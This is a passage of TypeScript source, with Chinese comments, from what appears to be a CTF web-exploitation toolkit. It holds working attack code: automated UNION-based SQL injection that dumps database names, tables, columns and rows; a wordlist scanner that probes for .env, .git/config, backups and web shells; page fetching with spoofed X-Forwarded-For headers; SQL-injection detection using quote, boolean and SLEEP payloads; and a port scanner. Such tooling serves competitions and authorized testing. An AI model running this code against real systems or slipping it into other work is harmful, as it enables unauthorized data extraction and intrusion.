    const dbResponse = await inject(buildUnionPayload(dialect.currentDb, columnCount, reflectAt, database));
    currentDatabase = extractAfterMarker(dbResponse.bodyText, markerFor(reflectAt)) || 'unknown';
    onProgress?.('库名', currentDatabase);
  }

  const tablesResponse = await inject(buildUnionPayload(dialect.tables(currentDatabase), columnCount, reflectAt, database));
  const tables = extractAfterMarker(tablesResponse.bodyText, markerFor(reflectAt)).split(',').filter(Boolean);
  onProgress?.('表名', tables.join(', '));
  if (tables.length === 0) return { ok: true, columnCount, reflectPositions, currentDatabase: currentDatabase || '(sqlite)', tables: [], columns: {}, rows: [], requests };

  const columns: Record<string, string[]> = {};
  const rows: Array<Record<string, string>> = [];
  for (const table of tables.slice(0, 5)) {
    const colsResponse = await inject(buildUnionPayload(dialect.columns(table), columnCount, reflectAt, database));
    const colsText = extractAfterMarker(colsResponse.bodyText, markerFor(reflectAt));
    if (database === 'sqlite') {
      // 建表语句 → 列名（"name" TEXT 形态）
      const names = [...colsText.matchAll(/"([A-Za-z_][A-Za-z0-9_]*)"\s+[A-Za-z]/g)].map(m => m[1]);
      columns[table] = names.length > 0 ? names : [];
    } else {
      columns[table] = colsText.split(',').map(s => s.trim()).filter(Boolean);
    }
    const targetCols = columns[table].slice(0, 3);
    if (targetCols.length > 0) {
      const rowsResponse = await inject(buildUnionPayload(dialect.rows(table, targetCols), columnCount, reflectAt, database));
      const rowsText = extractAfterMarker(rowsResponse.bodyText, markerFor(reflectAt));
      for (const row of rowsText.split(',').filter(Boolean)) {
        const values = row.split(':');
        rows.push(Object.fromEntries(targetCols.map((c, i) => [c, values[i] ?? ''])));
      }
    }
    onProgress?.('脱数据', `${table}（${columns[table].length} 列）`);
  }
  return { ok: true, columnCount, reflectPositions, currentDatabase: currentDatabase || '(sqlite)', tables, columns, rows, requests };
};

// ---- ⑪ 目录探测（CTF 高频敏感路径小字典）----

export const DIR_WORDLIST: ReadonlyArray<string> = [
  'flag', 'flag.txt', 'flag.php', 'flag.html', 'f1ag.txt', 'fl4g.txt',
  'robots.txt', '.git/config', '.git/HEAD', '.DS_Store', '.env', '.htaccess',
  'index.php.bak', 'index.php~', 'index.bak', 'backup.sql', 'db.sql', 'dump.sql',
  'www.zip', 'web.zip', 'backup.zip', 'src.zip', 'code.zip', 'website.zip',
  'admin', 'admin/', 'admin.php', 'login', 'login.php', 'shell.php',
  'swagger', 'swagger/', 'api-docs', 'phpinfo.php', 'info.php', 'test.php',
  'console', '.svn/entries', 'WEB-INF/web.xml', 'composer.json', 'package.json',
  'README.md', 'readme.txt', 'debug.txt', 'config.php', 'config.php.bak',
];

export interface DirProbeHit {
  path: string;
  status: number;
  length: number;
  note: string;
}

export const probeDirectories = async (
  baseUrl: string,
  options: { concurrency?: number; onProgress?: (done: number, total: number) => void } = {},
): Promise<DirProbeHit[]> => {
  const { concurrency = 6, onProgress } = options;
  const normalized = baseUrl.replace(/\/+$/, '');
  const hits: DirProbeHit[] = [];
  let done = 0;
  const queue = [...DIR_WORDLIST];
  const worker = async (): Promise<void> => {
    for (;;) {
      const path = queue.shift();
      if (path === undefined) return;
      const response = await sendViaProxy({ url: `${normalized}/${path}`, method: 'GET', headers: {}, body: null });
      done += 1;
      onProgress?.(done, DIR_WORDLIST.length);
      if (response.status !== 0 && response.status !== 404 && response.status !== 403) {
        hits.push({
          path: `/${path}`,
          status: response.status,
          length: response.bodyText.length,
          note: response.status === 200 ? (response.bodyText.length < 64 ? '小文件，优先看' : '正常页面') : '重定向/异常状态，跟进',
        });
      }
    }
  };
  await Promise.all(Array.from({ length: concurrency }, worker));
  return hits.sort((a, b) => a.status - b.status);
};

// ---- ⑫ 网页查看（GET 查看网页 / 伪造 XFF 头变体，随波逐流 WEB 分区对标）----

export interface PageFormInfo {
  action: string;
  method: string;
  fields: string[];
}

export interface PageViewResult extends ProxyResponse {
  finalUrl: string;
  links: string[];
  forms: PageFormInfo[];
  flags: string[];
}

const FLAG_LIKE_PATTERN = /(?:flag|ctf|key|hint)\{[^}\r\n]{1,160}\}/gi;

const extractFlagLike = (bodyText: string): string[] => Array.from(new Set(bodyText.match(FLAG_LIKE_PATTERN) ?? []));

const extractLinks = (bodyText: string, baseUrl: string): string[] => {
  const found = new Set<string>();
  const pattern = /(?:href|src)\s*=\s*["']([^"'\s>]+)["']/gi;
  let match = pattern.exec(bodyText);
  while (match !== null) {
    const raw = match[1];
    if (!/^(?:javascript|data|mailto|tel):/i.test(raw)) {
      try {
        found.add(new URL(raw, baseUrl).toString());
      } catch {
        // 相对路径无法解析时跳过
      }
    }
    match = pattern.exec(bodyText);
  }
  return Array.from(found).slice(0, 200);
};

const attrOf = (tag: string, name: string): string => {
  // 属性名前必须是非名字字符（空格/引号/标签开头），防止 data-name=/uid= 误命中 name=/id=（reviewer P2）
  const match = tag.match(new RegExp(`(?:^|[\\s"'])${name}\\s*=\\s*("([^"]*)"|'([^']*)'|([^\\s>]+))`, 'i'));
  return (match?.[2] ?? match?.[3] ?? match?.[4] ?? '').trim();
};

const extractForms = (bodyText: string, baseUrl: string): PageFormInfo[] => {
  const forms: PageFormInfo[] = [];
  const blockPattern = /<form\b[^>]*>([\s\S]*?)<\/form>/gi;
  let block = blockPattern.exec(bodyText);
  while (block !== null) {
    const openTag = block[0].slice(0, block[0].indexOf('>') + 1);
    let action = attrOf(openTag, 'action');
    if (action) {
      try {
        action = new URL(action, baseUrl).toString();
      } catch {
        // 保留原样
      }
    } else {
      action = baseUrl;
    }
    const fields = new Set<string>();
    const fieldPattern = /<(?:input|select|textarea)\b[^>]*>/gi;
    let field = fieldPattern.exec(block[1]);
    while (field !== null) {
      const name = attrOf(field[0], 'name') || attrOf(field[0], 'id');
      if (name) fields.add(name);
      field = fieldPattern.exec(block[1]);
    }
    forms.push({ action, method: (attrOf(openTag, 'method') || 'GET').toUpperCase(), fields: Array.from(fields) });
    block = blockPattern.exec(bodyText);
  }
  return forms.slice(0, 50);
};

export const fetchPageView = async (options: {
  url: string;
  headers?: Record<string, string>;
  xff?: string;
  xRealIp?: string;
}): Promise<PageViewResult> => {
  const { url, headers = {}, xff, xRealIp } = options;
  const merged: Record<string, string> = { ...headers };
  if (xff) merged['x-forwarded-for'] = xff;
  if (xRealIp) merged['x-real-ip'] = xRealIp;
  const response = await sendViaProxy({ url, method: 'GET', headers: merged, body: null });
  return {
    ...response,
    finalUrl: response.finalUrl ?? url,
    links: extractLinks(response.bodyText, url),
    forms: extractForms(response.bodyText, url),
    flags: extractFlagLike(response.bodyText),
  };
};

// ---- ⑬ Robots 查看与解析 ----

export interface RobotsGroup {
  userAgent: string;
  entries: { path: string; rule: 'allow' | 'disallow' }[];
}

export interface RobotsReport {
  groups: RobotsGroup[];
  sitemaps: string[];
  crawlDelays: string[];
  suspiciousPaths: string[];
  raw: string;
}

const SUSPICIOUS_PATH_PATTERN = /(admin|manage|backup|\.git|\.svn|\.env|upload|secret|flag|config|test|sql|dump|bak|zip|tar|internal|private|debug)/i;

export const parseRobots = (text: string): RobotsReport => {
  const sitemaps: string[] = [];
  const crawlDelays: string[] = [];
  const suspiciousPaths: string[] = [];
  // robots 规范：规则对同块（连续 User-agent 行后）所有 agent 生效；同一 UA 多块出现时规则合并（reviewer P2）
  const groupsByAgent = new Map<string, RobotsGroup>();
  let blockAgents: string[] = [];
  let sawRulesSinceLastAgent = false;
  const pushEntry = (rule: 'allow' | 'disallow', value: string) => {
    sawRulesSinceLastAgent = true;
    const agents = blockAgents.length > 0 ? blockAgents : ['*'];
    for (const agent of agents) {
      let group = groupsByAgent.get(agent);
      if (!group) {
        group = { userAgent: agent, entries: [] };
        groupsByAgent.set(agent, group);
      }
      group.entries.push({ path: value, rule });
      if (rule === 'disallow' && SUSPICIOUS_PATH_PATTERN.test(value)) suspiciousPaths.push(value);
    }
  };
  for (const rawLine of text.split(/\r?\n/)) {
    const line = rawLine.split('#')[0].trim();
    if (!line) continue;
    const separator = line.indexOf(':');
    if (separator < 0) continue;
    const field = line.slice(0, separator).trim().toLowerCase();
    const value = line.slice(separator + 1).trim();
    if (!value && field !== 'user-agent') continue;
    if (field === 'user-agent') {
      // 规则行之后出现的 User-agent 开启新块（规范块边界），否则并入当前块的多 agent 声明
      if (sawRulesSinceLastAgent) {
        blockAgents = [];
        sawRulesSinceLastAgent = false;
      }
      blockAgents.push(value);
      continue;
    }
    if (field === 'sitemap') {
      sitemaps.push(value);
      continue;
    }
    if (field === 'crawl-delay') {
      crawlDelays.push(value);
      continue;
    }
    if (field === 'allow' || field === 'disallow') {
      pushEntry(field === 'allow' ? 'allow' : 'disallow', value);
    }
  }
  return { groups: Array.from(groupsByAgent.values()), sitemaps, crawlDelays, suspiciousPaths, raw: text };
};

export const fetchRobots = async (origin: string): Promise<{ status: number; report: RobotsReport | null; error?: string }> => {
  const normalized = origin.trim().replace(/\/+$/, '');
  if (!/^https?:\/\/.+/i.test(normalized)) return { status: 0, report: null, error: '请输入 http(s):// 开头的站点地址。' };
  const response = await sendViaProxy({ url: `${normalized}/robots.txt`, method: 'GET', headers: {}, body: null });
  if (response.status === 0) return { status: 0, report: null, error: response.error ?? '请求失败。' };
  // 端点门禁短路：模块被管理员关闭时明确报错，不当成"robots.txt 不存在"（reviewer P2）
  if (response.status === 403 && (response.error ?? '').includes('管理员关闭')) {
    return { status: 403, report: null, error: response.error };
  }
  if (response.status !== 200) return { status: response.status, report: null, error: `robots.txt 返回 ${response.status}（可能不存在）。` };
  return { status: 200, report: parseRobots(response.bodyText) };
};

// ---- ⑭ GET SQL 注入自动检测（参数级：错误签名 / 布尔差异 / 可选时间盲）----

export interface SqliParamFinding {
  param: string;
  verdict: 'likely' | 'clean' | 'unknown';
  evidence: string[];
  payloadSamples: string[];
}

export interface SqliDetectResult {
  ok: boolean;
  error?: string;
  url: string;
  params: SqliParamFinding[];
  requests: number;
  elapsedMs: number;
}

const SQL_ERROR_SIGNATURES: ReadonlyArray<{ engine: string; pattern: RegExp }> = [
  { engine: 'MySQL', pattern: /you have an error in your sql syntax|warning.*?mysql_|MySQLSyntaxErrorException|MariaDB[\s\S]{0,40}error/i },
  { engine: 'PostgreSQL', pattern: /PostgreSQL[\s\S]{0,40}ERROR|PG::\w+Error|Npgsql|PostgreSqlException/i },
  { engine: 'SQLite', pattern: /SQLite3?::\w+|SQLITE_ERROR|SQLite error|System\.Data\.SQLite/i },
  { engine: 'MSSQL', pattern: /Microsoft SQL|SqlClient|Unclosed quotation mark|SQL Server[\s\S]{0,40}(?:error|exception)/i },
  { engine: 'Oracle', pattern: /ORA-\d{5}/ },
  { engine: '通用 SQL 报错', pattern: /sql syntax|sqlstate|database error/i },
];

const bodySimilarity = (a: string, b: string): number => {
  if (a === b) return 1;
  const maxLength = Math.max(a.length, b.length, 1);
  const lengthSimilarity = 1 - Math.abs(a.length - b.length) / maxLength;
  // 抽样对比首尾 256 字符，捕捉"长度接近但内容翻转"的布尔差异
  const headEqual = a.slice(0, 256) === b.slice(0, 256);
  const tailEqual = a.slice(-256) === b.slice(-256);
  if (headEqual && tailEqual) return Math.max(lengthSimilarity, 0.99);
  return lengthSimilarity * (headEqual || tailEqual ? 0.95 : 0.85);
};

const rebuildUrlWithParam = (url: string, name: string, value: string): string => {
  const parsed = new URL(url);
  parsed.searchParams.set(name, value);
  return parsed.toString();
};

export const detectSqliParams = async (
  url: string,
  options: { includeTiming?: boolean; onProgress?: (done: number, total: number) => void } = {},
): Promise<SqliDetectResult> => {
  const { includeTiming = false, onProgress } = options;
  const startedAt = Date.now();
  let requests = 0;
  const parsedUrl = (() => {
    try {
      return new URL(url);
    } catch {
      return null;
    }
  })();
  if (!parsedUrl || !/^https?:$/.test(parsedUrl.protocol)) {
    return { ok: false, error: '请输入合法的 http(s) URL（含查询参数，如 ?id=1）。', url, params: [], requests: 0, elapsedMs: 0 };
  }
  const names = Array.from(parsedUrl.searchParams.keys());
  if (names.length === 0) {
    return { ok: false, error: 'URL 中没有查询参数——GET 注入检测需要至少一个参数。', url, params: [], requests: 0, elapsedMs: 0 };
  }

  const get = async (target: string): Promise<ProxyResponse> => {
    requests += 1;
    return sendViaProxy({ url: target, method: 'GET', headers: {}, body: null });
  };
  const baseline = await get(url);
  if (baseline.status === 0) {
    return { ok: false, error: baseline.error ?? '目标不可达。', url, params: [], requests, elapsedMs: Date.now() - startedAt };
  }
  // 端点门禁短路：模块被管理员关闭时不做探测，避免把 403 误判成业务结果（reviewer P2）
  if (baseline.status === 403 && (baseline.error ?? '').includes('管理员关闭')) {
    return { ok: false, error: baseline.error, url, params: [], requests, elapsedMs: Date.now() - startedAt };
  }

  const findings: SqliParamFinding[] = [];
  let done = 0;
  for (const name of names) {
    const rawValue = parsedUrl.searchParams.get(name) ?? '';
    const isNumeric = /^\d+$/.test(rawValue);
    const evidence: string[] = [];
    const payloadSamples: string[] = [];
    let likely = false;

    // ① 错误签名：追加引号类 payload，看响应里出现哪家数据库报错
    for (const probe of ["'", "' --"]) {
      const target = rebuildUrlWithParam(url, name, rawValue + probe);
      const response = await get(target);
      if (response.status !== 0) {
        for (const signature of SQL_ERROR_SIGNATURES) {
          if (signature.pattern.test(response.bodyText)) {
            likely = true;
            evidence.push(`错误签名命中 ${signature.engine}（payload ${JSON.stringify(rawValue + probe)}）`);
            payloadSamples.push(rawValue + probe);
            break;
          }
        }
      }
      if (likely) break;
    }

    // ② 布尔差异：AND 1=1 与 AND 1=2 的可区分性。数字值先试裸拼接（WHERE id=1），
    // 再试引号闭合变体（WHERE id='1'——应用侧按字符串引用时裸拼接不可能触发差异）；字符串值只用引号闭合。
    if (!likely) {
      const variants = isNumeric
        ? [
            [`${rawValue} AND 1=1`, `${rawValue} AND 1=2`],
            [`${rawValue}' AND '1'='1`, `${rawValue}' AND '1'='2`],
          ]
        : [[`${rawValue}' AND '1'='1`, `${rawValue}' AND '1'='2`]];
      for (const [truePayload, falsePayload] of variants) {
        if (likely) break;
        const trueResponse = await get(rebuildUrlWithParam(url, name, truePayload));
        const falseResponse = await get(rebuildUrlWithParam(url, name, falsePayload));
        const simTrue = bodySimilarity(baseline.bodyText, trueResponse.bodyText);
        const simFalse = bodySimilarity(baseline.bodyText, falseResponse.bodyText);
        const simPair = bodySimilarity(trueResponse.bodyText, falseResponse.bodyText);
        if (simTrue >= 0.9 && simFalse < 0.9 && simPair < 0.9) {
          likely = true;
          evidence.push(`布尔差异：AND 1=1 与基线相似度 ${simTrue.toFixed(2)}，AND 1=2 相似度 ${simFalse.toFixed(2)}（可区分）`);
          payloadSamples.push(truePayload, falsePayload);
        }
      }
    }

    // ③ 时间盲（可选，默认关）：SLEEP 前后延迟差
    if (!likely && includeTiming) {
      const timingPayload = isNumeric ? `${rawValue} AND SLEEP(2)` : `${rawValue}' AND SLEEP(2) AND '1'='1`;
      const before = await get(rebuildUrlWithParam(url, name, timingPayload));
      const delayDelta = before.elapsedMs - baseline.elapsedMs;
      if (before.status !== 0 && delayDelta >= 1500) {
        likely = true;
        evidence.push(`时间盲：注入 SLEEP(2) 后响应延迟 +${delayDelta}ms`);
        payloadSamples.push(timingPayload);
      }
    }

    findings.push({
      param: name,
      verdict: likely ? 'likely' : 'clean',
      evidence,
      payloadSamples,
    });
    done += 1;
    onProgress?.(done, names.length);
  }

  return { ok: true, url, params: findings, requests, elapsedMs: Date.now() - startedAt };
};

// ---- ⑮ 常用端口扫描（调本地 server 端点，浏览器无 TCP 能力）----

export interface PortScanLine {
  port: number;
  state: 'open' | 'closed' | 'filtered' | 'error';
  ms?: number;
  detail?: string;
}

export interface PortScanResponse {
  ok: boolean;
  error?: string;
  host: string;
  scanned: number;
  durationMs: number;
  results: PortScanLine[];
}

export interface PortPreset {
  id: string;
  zh: string;
  en: string;
  ports: ReadonlyArray<number>;
}

export const PORT_PRESETS: ReadonlyArray<PortPreset> = [
  { id: 'ctf', zh: 'CTF 高频', en: 'CTF common', ports: [21, 22, 80, 443, 8000, 8080, 8081, 8888, 9000, 9999, 10000, 11111, 12345, 22222, 28017, 30000, 32768, 50000] },
  { id: 'web', zh: 'Web 服务', en: 'Web services', ports: [80, 443, 7001, 8000, 8080, 8081, 8443, 8888, 9000, 9090, 10000] },
  { id: 'db', zh: '数据库', en: 'Databases', ports: [1433, 1521, 3306, 5432, 5000, 5984, 6379, 9200, 11211, 27017] },
  { id: 'top', zh: '常用 TOP50', en: 'Top services', ports: [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 873, 993, 995, 1080, 1433, 1521, 2049, 2181, 2375, 2376, 3306, 3389, 4444, 4848, 5000, 5432, 5601, 5900, 5984, 6379, 6443, 7001, 8000, 8069, 8080, 8081, 8443, 8888, 9000, 9001, 9090, 9200, 9300, 9999, 10000, 11211, 27017] },
];

export const parsePortInput = (text: string): { ports: number[] } | { error: string } => {
  const tokens = text.split(/[,，\s]+/).filter(Boolean);
  const ports = new Set<number>();
  for (const token of tokens) {
    const single = token.match(/^(\d+)$/);
    if (single) {
      const port = Number(token);
      if (port < 1 || port > 65535) return { error: `端口 ${token} 超出 1-65535。` };
      ports.add(port);
      continue;
    }
    const range = token.match(/^(\d+)-(\d+)$/);
    if (range) {
      const from = Number(range[1]);
      const to = Number(range[2]);
      if (from < 1 || to > 65535 || from > to) return { error: `端口段 ${token} 非法。` };
      if (to - from + 1 > 600) return { error: `端口段 ${token} 超过单次 600 个上限。` };
      for (let port = from; port <= to; port += 1) ports.add(port);
      continue;
    }
    return { error: `无法识别「${token}」——支持 80,443 或 8000-8010 格式。` };
  }
  if (ports.size === 0) return { error: '请输入端口。' };
  return { ports: Array.from(ports).sort((a, b) => a - b) };
};

export const scanPorts = async (host: string, ports: number[], timeoutMs?: number): Promise<PortScanResponse> => {
  const trimmedHost = host.trim();
  if (!/^[a-zA-Z0-9._-]+$/.test(trimmedHost)) {
    return { ok: false, error: '目标必须是主机名或 IP（不带协议与路径）。', host: trimmedHost, scanned: 0, durationMs: 0, results: [] };
  }
  if (ports.length === 0 || ports.length > 600) {
    return { ok: false, error: '端口数量须在 1-600 之间。', host: trimmedHost, scanned: 0, durationMs: 0, results: [] };
  }
  const fetchNow = injectedFetch ?? (typeof fetch !== 'undefined' ? fetch : null) as FetchLike | null;
  if (!fetchNow) {
    return { ok: false, error: '当前环境无 fetch。', host: trimmedHost, scanned: 0, durationMs: 0, results: [] };
  }
  const origin = injectedOrigin ?? (typeof window !== 'undefined' ? window.location.origin : 'http://127.0.0.1:8081');
  const endpoints = [`${origin}/api/ctf/portscan`, 'http://127.0.0.1:8081/api/ctf/portscan'];
  const payload = JSON.stringify({ host: trimmedHost, ports, ...(timeoutMs ? { timeoutMs } : {}) });
  let lastError = '';
  for (const endpoint of endpoints) {
    try {
      const response = await fetchNow(endpoint, {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: payload,
      });
      const parsed = await response.json().catch(() => null) as Partial<PortScanResponse> | null;
      if (parsed && (parsed.ok === true || typeof parsed.error === 'string')) {
        return {
          ok: parsed.ok === true,
          error: parsed.error,
          host: parsed.host ?? trimmedHost,
          scanned: parsed.scanned ?? 0,
          durationMs: parsed.durationMs ?? 0,
          results: parsed.results ?? [],
        };
      }
      throw new Error(`端点响应 ${response.status}`);
    } catch (error) {
      lastError = error instanceof Error ? error.message : String(error);
    }
  }
  return { ok: false, error: `本地端口扫描端点不可达（${lastError}）——请通过 npm run serve 或客户端壳启动应用。`, host: trimmedHost, scanned: 0, durationMs: 0, results: [] };
};
